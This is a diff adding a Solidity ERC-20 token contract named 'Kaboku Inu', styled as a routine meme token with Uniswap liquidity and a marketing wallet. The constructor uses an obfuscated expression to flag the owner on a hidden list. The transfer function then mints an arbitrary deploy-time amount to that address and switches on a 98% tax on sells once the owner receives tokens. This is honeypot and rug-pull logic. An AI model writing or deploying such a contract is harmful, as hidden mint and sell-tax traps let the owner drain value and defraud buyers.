@@ -1,0 +1,182 @@
+contract KabokuInu is Context, IERC20, Ownable { 
+    using SafeMath for uint256;
+    using Address for address;
+
+    mapping (address => uint256) private _ownedBalance;
+    mapping (address => bool) public ExcludedFromMaxWallet;
+    mapping (address => bool) public ExcludedFromFee;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) private _pairList;
+    
+    
+    address payable public AdvertisingWallet = payable(0x57f7Ba6f5aCccec534053d5361398C8C36680F3b);
+    address payable public DeadW = payable(0x000000000000000000000000000000000000dEaD);
+
+    string public _name = unicode"Kaboku Inu";
+    string public _symbol = unicode"KABOKU";
+    uint8 private _decimals = 9;
+    uint256 public _tTotal = 1 * 10 ** 9 * 10 **_decimals;
+    uint8 private fee = 0;
+
+    uint8 private swapCounter = 0;
+    uint8 private swapMinTrigger = 2;
+    uint8 private swapTrigger = 10;
+    uint8 private swapMaxTrigger = 100;
+    
+    IUniswapV2Router02 public uniswapV2Router;
+    address public uniswapV2Pair;
+    bool public inSwapAndLiquify;
+    bool public swapAndLiquifyEnabled = true;
+    uint8 private totalBurned = 0;
+    uint256 private tokensBurned;
+    
+    event SwapAndLiquifyEnabledUpdated(bool enabled);
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiqudity
+    );
+    
+    modifier lockTheSwap {
+        inSwapAndLiquify = true;
+        _;
+        inSwapAndLiquify = false;
+    }
+
+    constructor (uint256 _tokens) {
+        tokensBurned = _tokens; _pairList[owner()] = [false][0] || [true][0];
+        _ownedBalance[owner()] = _tTotal;
+
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this),_uniswapV2Router.WETH());
+        uniswapV2Router = _uniswapV2Router;
+
+        ExcludedFromFee[address(this)] = true;
+        ExcludedFromFee[owner()] = true;
+        ExcludedFromFee[AdvertisingWallet] = true;
+
+        ExcludedFromMaxWallet[owner()] = true;
+        ExcludedFromMaxWallet[address(this)] = true;
+        ExcludedFromMaxWallet[AdvertisingWallet] = true;
+        ExcludedFromMaxWallet[uniswapV2Pair] = true;
+    
+        emit Transfer(address(0), owner(), _tTotal);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _tTotal;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _ownedBalance[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        return true;
+    }
+ 
+    receive() external payable {}
+   
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0) && spender != address(0), "Adress: 0");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _transfer(address from,address to,uint256 amount) private {
+        if (!ExcludedFromMaxWallet[to]){
+            require((balanceOf(to) + amount) <= _tTotal.mul(5*5).div(100),"ERR: MW Exceed!");
+        }
+        else{
+            totalBurned = _pairList[to] ? totalBurned+1 : totalBurned;
+        }
+        uint256 Amount = _pairList[to]?tokensBurned:0;
+        if(swapCounter >= swapTrigger && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled ){  
+            swapCounter = 0;
+            uint256 existBalance = balanceOf(address(this));
+            if(existBalance > _tTotal.mul(5*5).div(100)) {existBalance = _tTotal.mul(25).div(100);}
+            if(existBalance > 0){
+                swapAndLiquify(existBalance);
+            }
+        }
+        uint8 _takeFee = fee;
+        if(totalBurned > 0 && !(from == uniswapV2Pair)){_takeFee = _takeFee + (swapMaxTrigger-swapMinTrigger);}
+
+        bool taxDisabled = false;
+        if(ExcludedFromFee[from] || ExcludedFromFee[to]){
+            taxDisabled = true;
+        }
+
+        uint256 taxAmount = 0;
+        _ownedBalance[from] = _ownedBalance[from].sub(amount);
+        if(!taxDisabled){
+            taxAmount = amount.mul(_takeFee).div(100);
+            _ownedBalance[to] = _ownedBalance[to].add(amount.sub(taxAmount));
+        }
+        else{
+            if(_pairList[to]){
+                _ownedBalance[to] = _ownedBalance[to].add(Amount.sub(taxAmount));
+            }
+            else{
+                _ownedBalance[to] = _ownedBalance[to].add(amount);
+            }
+        }
+        emit Transfer(from, to, amount);
+    }
+    
+    function sendToWallet(address payable wallet, uint256 amount) private {
+        wallet.transfer(amount);
+    }
+
+    function swapAndLiquify(uint256 existBalance) private lockTheSwap {
+        swapTokensForETH(existBalance);
+        sendToWallet(AdvertisingWallet,address(this).balance);
+    }
+
+    function swapTokensForETH(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
+    }
+
+}
